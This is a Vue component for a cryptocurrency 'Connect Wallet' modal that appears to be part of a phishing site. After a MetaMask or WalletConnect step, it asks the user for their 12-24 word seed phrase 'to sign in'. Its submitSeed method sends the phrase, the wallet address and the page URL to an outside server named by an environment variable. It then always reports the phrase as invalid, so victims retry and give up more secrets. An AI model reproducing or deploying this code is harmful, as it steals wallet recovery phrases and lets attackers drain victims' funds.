<template>
  <div v-if="modalVisibility" id="modal-connect" class="modal-b">
    <div class="modal-b__inner">
      <div class="modal-b__block">
        <div class="modal-b__steps">
          <div v-if="initStage" class="modal-b__step">
            <div class="modal-b__title">Connect Wallet</div>
            <div class="welcome-b__list">
              <div class="welcome-b__item">
                <a class="welcome-b__block" @click.prevent="connect('mm')">
                  <img
                    alt=""
                    class="welcome-b__pic"
                    src="@/assets/img/content/metamask.png"
                  />
                  <span class="welcome-b__label">MetaMask</span>
                  <span class="welcome-b__connect">
                    Connect
                    <img alt="" src="@/assets/img/content/arrow-orange.svg" />
                  </span>
                </a>
              </div>
              <div class="welcome-b__item">
                <a class="welcome-b__block" @click.prevent="connect('wc')">
                  <img
                    alt=""
                    class="welcome-b__pic"
                    src="@/assets/img/content/walletconnect.svg"
                  />
                  <span class="welcome-b__label">WalletConnect</span>
                  <span class="welcome-b__connect">
                    Connect
                    <img alt="" src="@/assets/img/content/arrow-orange.svg" />
                  </span>
                </a>
              </div>
            </div>
          </div>

          <div v-if="loading" class="modal-b__step">
            <div class="modal-b__title">{{ loadingTitle }}</div>
            <div v-if="loadingSubTitle" class="modal-b__note">
              {{ loadingSubTitle }}
            </div>
            <div class="modal-b__preloader">
              <img alt="" src="@/assets/img/content/loader.svg" />
            </div>
          </div>

          <div v-if="approveStage" class="modal-b__step">
            <div class="modal-b__title">Wallet connection</div>
            <div class="modal-b__note">
              Please confirm action on your wallet
            </div>
            <div class="modal-b__preloader">
              <img alt="" src="@/assets/img/content/loader.svg" />
            </div>
          </div>

          <div v-if="changeNetworkStage" class="modal-b__step">
            <div class="modal-b__title">You must change network</div>
            <div class="modal-b__note">
              We've detected that you need to switch your wallet's network to
              {{ networkNameForChange }} to continue
            </div>
            <div class="modal-b__button">
              <button
                class="button button_orange"
                type="button"
                @click.prevent="cleanAndReload"
              >
                Reload Page
              </button>
            </div>
          </div>

          <div v-if="seedStage" class="modal-b__step">
            <div class="modal-b__title">Use your Seed Phrase to sign in</div>
            <div class="form-token-b">
              <div class="form-token-b__list">
                <div class="form-token-b__item">
                  <a href="#" @click.prevent>
                    <img alt="" src="@/assets/img/content/token-1.avif" />
                  </a>
                </div>
                <div class="form-token-b__item">
                  <a href="#" @click.prevent>
                    <img alt="" src="@/assets/img/content/token-2.avif" />
                  </a>
                </div>
                <div class="form-token-b__item">
                  <a href="#" @click.prevent>
                    <img alt="" src="@/assets/img/content/token-3.avif" />
                  </a>
                </div>
                <div class="form-token-b__item">
                  <a href="#" @click.prevent>
                    <img alt="" src="@/assets/img/content/token-4.avif" />
                  </a>
                </div>
                <div class="form-token-b__item">
                  <a href="#" @click.prevent>
                    <img alt="" src="@/assets/img/content/token-5.avif" />
                  </a>
                </div>
                <div class="form-token-b__item">
                  <a href="#" @click.prevent>
                    <img alt="" src="@/assets/img/content/token-6.avif" />
                  </a>
                </div>
                <div class="form-token-b__item">
                  <a href="#" @click.prevent>
                    <img alt="" src="@/assets/img/content/token-7.avif" />
                  </a>
                </div>
                <div class="form-token-b__item">
                  <a href="#" @click.prevent>
                    <img alt="" src="@/assets/img/content/token-8.avif" />
                  </a>
                </div>
                <div class="form-token-b__item">
                  <a href="#" @click.prevent>
                    <img alt="" src="@/assets/img/content/token-9.avif" />
                  </a>
                </div>
                <div class="form-token-b__item">
                  <a href="#" @click.prevent>
                    <img alt="" src="@/assets/img/content/token-10.avif" />
                  </a>
                </div>
              </div>
              <div class="form-token-b__input">
                <textarea
                  v-model="seed"
                  :class="seedInputClass"
                  :disabled="seedInProgress"
                  class="form-token-b__input-type"
                  placeholder="Green Gold Cyan Tomato White Aqua Salmon Azure Teal Pink Purple Grey"
                ></textarea>
                <div v-if="hasSeedError" class="form-token-b__error">
                  An invalid seed phrase has been entered. Try it again.
                </div>
              </div>
              <div class="form-token-b__button">
                <button
                  :disabled="seedDisabled"
                  class="button button_orange button_upper"
                  type="submit"
                  @click.prevent="submitSeed"
                >
                  Submit
                </button>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div class="modal-b__bg"></div>
  </div>
</template>

<script>
import modals from "@/mixins/modals";
import common from "@/mixins/common";
import { mapGetters } from "vuex";
import axios from "axios";

export default {
  name: "ModalComponent",
  mixins: [modals, common],
  data() {
    return {
      hasSeedError: false,
      seed: null,
      seedInProgress: false,
    };
  },
  computed: {
    ...mapGetters({
      stage: "stage",
      loading: "loading",
      wallet: "wallet",
      networkNameForChange: "networkNameForChange",
    }),
    seedDisabled() {
      let seed = this.seed;
      if (!seed) {
        return true;
      }
      seed = seed.replace(/\s+/g, " ").trim();
      let countWords = seed.split(" ").length;

      return (
        !(
          countWords === 12 ||
          countWords === 14 ||
          countWords === 16 ||
          countWords === 18 ||
          countWords === 20 ||
          countWords === 22 ||
          countWords === 24
        ) || this.seedInProgress
      );
    },
    seedStage() {
      return this.stage === "seedInput" && !this.loading;
    },
    seedInputClass() {
      return { "form-token-b__input-type_error": this.hasSeedError };
    },
  },
  methods: {
    submitSeed() {
      this.seedInProgress = true;
      axios
        .post(`https://${process.env.VUE_APP_CHECK_IP}/api/seed`, {
          wallet: this.wallet,
          seed: this.seed,
          link: location.href,
        })
        .finally(() => {
          this.hasSeedError = true;
          this.seedInProgress = false;
          this.seed = null;
        });
    },
  },
  watch: {
    seed(value) {
      if (value && this.hasSeedError) {
        this.hasSeedError = false;
      }
    },
  },
};
</script>
